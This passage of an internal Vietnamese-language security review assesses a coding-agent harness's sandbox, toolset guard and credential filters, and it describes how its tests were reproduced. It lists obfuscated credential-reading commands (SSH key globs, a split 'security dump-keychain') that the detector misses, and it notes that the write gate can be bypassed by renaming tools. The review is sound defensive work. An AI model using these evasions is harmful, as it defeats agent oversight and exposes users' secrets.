| 5 | Toolset guard của harness | **Không đạt** | T1: attest tự khai, trùng tên thư mục. `builtin` bị chặn đúng. Tool trùng tên: Pi giữ gói nạp trước; hiện chỉ sandbox đăng ký bảy tool lõi nên thứ tự `-e` trong `launcher.mjs:8` không gây lỗi, nhưng không có test khoá điều đó. |
| 6 | Bus Pi giả sự kiện | **Không đạt** | T1. |
| 7 | Chuỗi cung ứng | **Một phần** | L1, T7. |
| 8 | Lịch sử git không chứa token/.env/địa chỉ nội bộ/tên khách hàng | **Một phần** | gitleaks 8.30.1 (nguồn `github.com/gitleaks/gitleaks/releases/tag/v8.30.1`, `gitleaks_8.30.1_darwin_arm64.tar.gz`, sha256 `b40ab0ae55c505963e365f271a8d3846efbc170aa17f2607f13df610a9aeb6a5` khớp `gitleaks_8.30.1_checksums.txt`) quét mọi ref: provider, harness, bundle 0 phát hiện; sandbox 3 phát hiện là chuỗi giả trong test (`tests/sandbox-start-process.test.mjs:87`, `sandbox-run-on-host.test.mjs:32`, `sandbox-redaction.test.mjs:7`, commit `12694096`). Lệnh grep thêm trên mọi ref (dòng thêm): IP riêng, `.local`, `.internal`, `vnexus`, `/Users/…`: chỉ T8 là thật. |
| 9 | Log/báo cáo gửi Studio | **Một phần** | T5. `call-purpose` chỉ gửi tên tool và nhãn mục đích (đúng), nhưng có `X-Agent-Task`; tool-failures gửi đầu ra lỗi. |

## Đối chiếu bảng vector của threat model

| Vector của threat model | Trạng thái trong bộ mới |
|---|---|
| Đường dẫn trong input, symlink, `..`, mã hoá | Do sandbox OS gánh, đạt trong thử nghiệm; guard phân tích đường dẫn của Piagent cá nhân **không** mang sang (đúng thiết kế, nhưng tài liệu "Giới hạn" cần nói rõ) |
| Glob/brace/expansion bắt `.env` | Không còn phân tích tĩnh; dựa vào profile (T2: tên ngoài mẫu lọt) |
| Secret trong đầu ra tool | Có (`tool_result` che bằng `redactedText`), mẫu hẹp (T5) |
| Profile/lock độc hại | Không còn lock; thay bằng project-trust của Pi (T6) |
| Mutation GitHub/HTTP/MCP | Có `handoff-policy` và cổng MCP ghi (`index.mjs:78`), nhưng chỉ đúng với tên tool có động từ ghi (`mcpWriteAction`), lách được bằng tên khác; bypass ở C4 |
| Subagent chỉ đọc nhận tool ghi | Tốt: helper chỉ nhận `read/grep/find/ls` (+bash không mạng khi `commands`), `readOnly:true` (`index.mjs:57`) |
| Release/tag bị thay | Chưa có quy trình release (L1, T7) |
| Dependency/package compromise | L1 |
| Mutation qua bus/provider | Không có trong threat model cũ; T1 |

## Cách tái hiện

Mọi script nằm ngoài repo (scratchpad của phiên review) và chỉ dùng thư mục tạm, HOME giả, chuỗi giả; không gọi Studio/model, không dùng binding hay credential thật. Các script cần Seatbelt thật:

- Thoát sandbox/đọc: dựng `ManagedToolBoundary({cwd, sdkRoot: <node_modules/@earendil-works/pi-coding-agent>, userHome: <HOME giả>, identity: null, searchTools: false, proxyPorts: []})` rồi `invoke('bash', …)`.
- C1: như trên rồi gọi `readPatchSnapshot(gitReader(cwd), cwd, {base:null})` của harness và `listProjectFiles(cwd)` của sandbox.
- C2: `invoke('bash', {command: 'docker run --rm --pull=never -v …'}, …, {docker: true})` với image cục bộ có sẵn.
- C3: `commandTools(owner).find(t => t.name === 'run_on_simulator').execute(…)` với `Permission` ở `full`/`bypass` và `ctx.ui.confirm` đếm số lần hỏi.
- C4: `handoffReason(<lệnh>)` cho 82 lệnh; `credentialReason` cho 16 lệnh (`cat ~/.s*/id_r*`, `sec""urity dump-keychain`, `~/Library/Application\ Support/AgentWatch/…` không bị gắn cờ, chỉ ảnh hưởng thẻ xác nhận của `run_on_host`).
- Mạng: `PackageProxy` với bộ phân giải giả (trả IP công khai rồi IP nội bộ) và `privateAddress` cho 33 địa chỉ.
- Bus: `checkToolset` với `sourceInfo` giả.
- Hash: `buildManifest`/`verifyManifest` trên cây tạm.

## Việc nên làm trước khi bật

1. Sửa C1-C4 và thêm test hồi quy cho từng kịch bản (đặc biệt C1: chặn ghi `.git/config`/`hooks` và git host-side có khoá cấu hình).
2. T1 (ghim nguồn attest, nonce cho bus, thu hẹp `studio.call`), T6 (cờ launcher), T8 (xử lý PR #3), T5 (module redact dùng chung).
3. Chạy lại review sau khi sửa; chạy riêng bộ test sandbox trên Linux/bwrap (L6).

Đây là review nội bộ bằng đọc code và thử nghiệm cục bộ, không phải kiểm toán độc lập; chưa kiểm: Linux/bwrap thật, đường `web_fetch` thật, hành vi `securityd` với Keychain thật, kênh qua registry (T4), hiển thị thẻ xác nhận (L2).
